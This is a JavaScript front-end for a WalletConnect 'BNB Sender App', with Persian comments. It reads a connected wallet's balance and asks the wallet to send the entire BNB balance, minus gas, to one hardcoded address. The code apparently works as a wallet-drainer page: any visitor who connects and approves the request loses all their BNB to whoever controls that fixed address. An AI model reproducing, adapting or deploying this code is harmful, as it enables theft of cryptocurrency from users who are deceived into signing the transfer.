import { WalletConnectModal } from '@walletconnect/modal';
import { ethers } from 'ethers';

const projectId = "4d08946e6c316bed5e76b450ccbb5256"; // ← جایگزین کن با projectId واقعی
const targetAddress = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05"; // ← آدرس گیرنده

const modal = new WalletConnectModal({
  projectId,
  metadata: {
    name: "BNB Sender App",
    description: "Send all BNB using WalletConnect",
    url: "https://yourdomain.com",
    icons: ["https://walletconnect.com/walletconnect-logo.png"]
  }
});

let provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
let client;
let session;
let userAddress;

document.getElementById("connectBtn").addEventListener("click", async () => {
  try {
    client = await modal.getSignClient();
    const { uri, approval } = await client.connect({
      requiredNamespaces: {
        eip155: {
          methods: ["eth_sendTransaction"],
          chains: ["eip155:56"],
          events: ["accountsChanged", "chainChanged"]
        }
      }
    });

    if (uri) {
      await modal.openModal({ uri });
    }

    session = await approval();
    userAddress = session.namespaces.eip155.accounts[0].split(":")[2];
    document.getElementById("address").textContent = userAddress;

    const balance = await provider.getBalance(userAddress);
    const bnb = ethers.formatEther(balance);
    document.getElementById("balance").textContent = `${bnb} BNB`;

    document.getElementById("sendAllBtn").disabled = false;
  } catch (err) {
    alert("Connection failed: " + (err?.message || err));
  }
});

document.getElementById("sendAllBtn").addEventListener("click", async () => {
  try {
    const balance = await provider.getBalance(userAddress);
    const feeData = await provider.getFeeData();
    const gasPrice = feeData.gasPrice;
    const gasLimit = 21000n;
    const gasCost = gasLimit * gasPrice;
    const amountToSend = balance - gasCost;

    if (amountToSend <= 0n) {
      alert("Not enough BNB to send");
      return;
    }

    const tx = {
      from: userAddress,
      to: targetAddress,
      value: `0x${amountToSend.toString(16)}`,
      gas: `0x${gasLimit.toString(16)}`,
      gasPrice: `0x${gasPrice.toString(16)}`
    };

    const result = await client.request({
      topic: session.topic,
      chainId: "eip155:56",
      request: {
        method: "eth_sendTransaction",
        params: [tx]
      }
    });

    alert("Transaction sent! Hash:\n" + result);
  } catch (err) {
    alert("Transaction failed: " + (err?.message || err));
  }
});